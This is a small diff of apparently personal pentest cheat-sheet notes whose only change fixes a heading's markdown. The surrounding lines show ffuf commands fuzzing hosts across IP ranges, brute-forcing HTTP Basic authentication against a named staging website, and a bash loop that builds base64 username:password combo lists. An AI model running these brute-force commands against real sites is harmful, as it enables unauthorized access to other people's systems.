@@ -36,7 +36,7 @@ for ip in $(cat cidr.txt);do echo $ip &&  ffuf -w ./subdomains.txt -u http://$ip
 ```
 ffuf -w ~/WordList/mylist/combo.txt -u https://staging.walmartvriddhi.org/wp-content/uploads/2022/07/Mask-Group-15.png -H "Authorization: Basic FUZZ" -fc 401
 ```
-** Bash for make Combo List
+** Bash for make Combo List **
 ```
 for user in $(cat ~/WordList/mylist/user.txt);do for pass in $(cat ~/WordList/mylist/password.txt); do echo -n "$user:$pass" | base64; done; done > combo.txt
 ```
